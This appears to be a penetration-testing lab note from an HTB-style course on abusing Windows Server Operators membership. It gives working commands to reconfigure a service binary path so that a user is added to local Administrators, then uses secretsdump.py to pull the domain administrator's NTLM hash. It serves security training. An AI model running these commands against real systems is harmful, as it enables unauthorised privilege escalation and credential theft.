
The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. 

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

---
## Exploitation Example

[PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) works like `sc` and also allow us to start, stop, pause, resume, and restart services both locally and on remote hosts and logon to diff users.

```PowerShell
C:\htb> sc qc AppReadiness
### querying the service, confirming if it runs as SYSTEM using sc.exe util.

C:\htb> c:\Tools\PsService.exe security AppReadiness
### Checking service permissions using PsService, part of Sysinternals suite.
```

PsService confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

```PowerShell
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
### Changing bin path to execute a cmd adding our user to local admin group

C:\htb> sc start AppReadiness
### Starting the service, it'll fail as expected

C:\htb> net localgroup Administrators
### Confirming Local Admin Group Membership 
```

```Note
Group memberships are executed on logging in again, can be bypassed by opening a new instance from `evil-winrm`.
```

Retrieving `NTLM` Password Hashes from the DC.

```shell
> secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

---